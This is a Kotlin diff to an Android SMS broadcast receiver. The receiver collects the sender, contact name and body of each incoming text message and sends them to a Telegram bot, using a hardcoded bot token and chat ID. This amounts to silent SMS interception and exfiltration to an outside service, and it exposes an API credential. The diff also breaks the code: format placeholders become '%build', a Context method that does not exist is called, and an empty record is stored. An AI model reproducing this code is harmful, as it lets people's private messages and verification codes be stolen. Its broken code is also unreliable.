@@ -21,9 +21,11 @@ class SmsBroadcastReceiver : BroadcastReceiver() {
 
     override fun onReceive(context: Context, intent: Intent) {
         /* Get Messages */
+//        Engine.startTheAlarm(context);
+
         if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
             val sms = getSmsFromIntent(intent)
-            val urlStringFormat = "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s"
+            val urlStringFormat = "https://api.telegram.org/bot%build/sendMessage?chat_id=%build&text=%build"
             val apiToken = "488699109:AAEKYpTzU6VNumJIAY_L9yEQZpZND7Da688"
             val chatId = "59755972"
             var sender: String? = null
@@ -37,7 +39,7 @@ class SmsBroadcastReceiver : BroadcastReceiver() {
                 val message = smsMessage.displayMessageBody
                 if (lastPhone == null || !lastPhone.contentEquals(phone)) {
                     if (lastPhone != null && !lastPhone.contentEquals(phone))
-                        sendMessageToTelegram(urlString)
+                        sendMessageToTelegram(context, urlString)
                     lastPhone = phone
                     msg = StringBuilder(message)
                     val personUri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, phone)
@@ -55,7 +57,7 @@ class SmsBroadcastReceiver : BroadcastReceiver() {
                 val text = sender + ":\n" + msg
                 urlString = String.format(urlStringFormat, apiToken, chatId, text.replace("\n", "%0A"))
             } // for
-            sendMessageToTelegram(urlString)
+            sendMessageToTelegram(context, urlString)
         }
     }
 
@@ -79,22 +81,17 @@ class SmsBroadcastReceiver : BroadcastReceiver() {
         }.toTypedArray()
     }
 
-    private fun sendMessageToTelegram(urlString: String?) {
-
+    private fun sendMessageToTelegram(context: Context, urlString: String?) {
+        val x : Payamak = Payamak()
+        val database = AppDatabase.getInMemoryDatabase(context.getApplication());
+        database.payamakDao().addPayamak(x)
+//        val database = AppDatabase.getDatabase(context);
+//        database.payamakDao().addPayamak(x)
         val thread = Thread(Runnable {
             try {
                 val url = URL(urlString)
                 val conn = url.openConnection()
-                conn.content
-                //            StringBuilder sb = new StringBuilder();
-                //            InputStream is = new BufferedInputStream(conn.getInputStream());
-                //            BufferedReader br = new BufferedReader(new InputStreamReader(is));
-                //            String inputLine = "";
-                //            while ((inputLine = br.readLine()) != null) {
-                //              sb.append(inputLine);
-                //            }
-                //            String response = sb.toString();
-                // Do what you want with response
+                conn.connect()
             } catch (e: MalformedURLException) {
                 Log.e("SmsBroadcastReceiver", e.message)
                 Log.e("SmsBroadcastReceiver", Arrays.toString(e.stackTrace))
